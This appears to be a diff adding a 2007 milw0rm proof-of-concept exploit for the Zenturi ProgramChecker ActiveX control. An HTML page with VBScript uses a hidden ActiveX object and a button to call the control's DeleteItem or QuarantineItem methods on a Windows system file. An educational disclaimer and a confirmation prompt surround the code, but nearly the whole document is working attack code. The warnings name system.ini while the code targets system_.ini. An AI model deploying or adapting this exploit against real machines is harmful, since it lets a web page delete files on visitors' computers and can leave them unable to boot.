@@ -1,0 +1,53 @@
+<pre>
+<code><span style="font: 10pt Courier New;"><span class="general1-symbol">-----------------------------------------------------------------------------
+ <b>Zenturi ProgramChecker ActiveX Control Multiple Insecure Methods</b>
+ url: http://www.programchecker.com/activeintro.aspx
+
+ author: shinnai
+ mail: shinnai[at]autistici[dot]org
+ site: http://shinnai.altervista.org
+ 
+ This was written for educational purpose. Use it at your own risk.
+ Author will be not be responsible for any damage.
+ 
+ <b><font color="#FF0000">THE EXPLOIT WILL DELETE THE system.ini FILE SO BE SURE TO MAKE A COPY OF
+ IT BEFORE RUN THIS EXPLOIT OR YOUR PC WILL NOT RESTART!</font></b>
+
+ Tested on Windows XP Professional SP2 all patched, with Internet Explorer 7
+-----------------------------------------------------------------------------
+
+<object classid='clsid:41A5D8DB-EA47-4DE9-B249-1F55738FEA20' id='test' width='0' height='0'></object>
+
+<input language=VBScript onclick=tryMe() type=button value="Click here to start the test">
+
+<select style="width: 404px" name="Pucca">
+  <option value = "DeleteItem">DeleteItem</option>
+
+  <option value = "QuarantineItem">QuarantineItem</option>
+</select>
+
+<script language='vbscript'>
+ Sub tryMe
+  On Error Resume Next
+   Dim MyMsg
+   If(MsgBox("This was written for educational purpose. Use it at your own risk." & vbCrLf & _
+             "Author will be not be responsible for any damage." & vbCrLf & vbCrLf & _
+             "THIS EXPLOIT WILL DELETE THE system.ini FILE SO BE SURE TO MAKE A COPY" & _
+             " OF IT BEFORE RUN THIS EXPLOIT OR YOUR PC WILL NOT RESTART!" & VBcRlF & "ARE YOU" & _
+             " SURE YOU REALLY WANT TO RUN THIS EXPLOIT?",4)=vbYes) Then
+     if Pucca.value = "DeleteItem" Then
+      test.DeleteItem "c:\windows\system_.ini" ,"c:\windows\system_.ini"
+      MyMsg = MsgBox ("Check now the file system.ini" & vbCrLf & "It's deleted.", 64,"Zenturi ProgramChecker ActiveX")
+     ElseIf Pucca.value = "QuarantineItem" Then
+      test.QuarantineItem "c:\windows\system_.ini"
+      MyMsg = MsgBox ("Check now the file system.ini" & vbCrLf & "It's deleted.", 64,"Zenturi ProgramChecker ActiveX")
+     End If
+   Else
+    MyMsg = MsgBox ("Nice, be safe!", 64, "Zenturi ProgramChecker ActiveX")
+   End If 
+ End Sub
+</script>
+</span></span>
+</code></pre>
+
+# milw0rm.com [2007-06-08]
